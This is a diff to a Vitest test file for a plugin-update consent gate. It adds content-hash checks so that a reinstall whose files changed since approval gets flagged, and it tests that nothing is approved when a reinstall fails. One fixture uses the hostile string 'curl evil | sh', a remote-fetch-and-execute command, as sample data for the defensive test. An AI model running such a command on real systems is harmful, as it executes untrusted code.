@@ -102,6 +102,7 @@ describe('applyApprovedUpdates', () => {
           installedVersion: '1.0.0',
           latestVersion: '2.0.0',
           disclosed,
+          contentHash: 'sha256:a',
         },
         {
           packageName: 'beta',
@@ -116,7 +117,14 @@ describe('applyApprovedUpdates', () => {
       steps: [],
     }));
     applyPlan = vi.fn(async () => ({
-      checks: [{ packageName: 'alpha', scope: 'global', applied: { packageName: 'alpha' } }],
+      checks: [
+        {
+          packageName: 'alpha',
+          installPath: alpha,
+          scope: 'global',
+          applied: { packageName: 'alpha' },
+        },
+      ],
     }));
     onPluginsChanged = vi.fn<InstalledUpdatesDeps['onPluginsChanged']>();
     deps = {
@@ -164,6 +172,34 @@ describe('applyApprovedUpdates', () => {
     });
   });
 
+  it('settles consent for exactly what landed, before the refresh reads it (DOR-2306)', async () => {
+    // Purpose: a failed or skipped reinstall records nothing, and the refresh
+    // that loads the plugin must see the approval the settle just wrote.
+    const settle = vi.fn(async () => {});
+
+    await applyApprovedUpdates(deps, {}, async () => undefined, settle);
+
+    expect(settle).toHaveBeenCalledWith([
+      expect.objectContaining({ installPath: path.join(dorkHome, 'plugins', 'alpha') }),
+    ]);
+    expect(settle.mock.invocationCallOrder[0]).toBeLessThan(
+      onPluginsChanged.mock.invocationCallOrder[0] ?? 0
+    );
+  });
+
+  it('settles nothing when the reinstall failed', async () => {
+    applyPlan.mockResolvedValue({
+      checks: [
+        { packageName: 'alpha', installPath: 'x', scope: 'global', applyError: 'disk full' },
+      ],
+    });
+    const settle = vi.fn(async () => {});
+
+    await applyApprovedUpdates(deps, {}, async () => undefined, settle);
+
+    expect(settle).toHaveBeenCalledWith([]);
+  });
+
   it('runs nothing when the gate refuses', async () => {
     const outcome = await applyApprovedUpdates(deps, {}, async () => 'no');
 
@@ -194,7 +230,12 @@ describe('updatesNotAsShown', () => {
     executables: [],
     skillTools: [],
   });
-  const update = (installPath: string, latestVersion: string, disclosed: DisclosedEffects | null) =>
+  const update = (
+    installPath: string,
+    latestVersion: string,
+    disclosed: DisclosedEffects | null,
+    contentHash = 'sha256:a'
+  ) =>
     ({
       packageName: 'alpha',
       installPath,
@@ -203,6 +244,7 @@ describe('updatesNotAsShown', () => {
       installedVersion: '1.0.0',
       latestVersion,
       disclosed,
+      contentHash,
     }) satisfies ApprovableUpdate;
 
   it('passes a reinstall that is exactly what was shown, JSON round trip included', () => {
@@ -219,6 +261,13 @@ describe('updatesNotAsShown', () => {
     const now = update('/p/a', '2.0.0', effects('curl evil | sh'));
     const shown = update('/p/a', '2.0.0', effects('echo hi'));
     expect(updatesNotAsShown([now], [shown])).toEqual([now]);
+  });
+
+  it('flags a reinstall whose files moved though its version and programs did not (DOR-2306)', () => {
+    // Purpose: the same declarations over other bytes is the review's exploit;
+    // the apply must see it before anything is removed.
+    const now = update('/p/a', '2.0.0', effects('echo hi'), 'sha256:hostile');
+    expect(updatesNotAsShown([now], [update('/p/a', '2.0.0', effects('echo hi'))])).toEqual([now]);
   });
 
   it('flags a reinstall of another version than the one shown', () => {
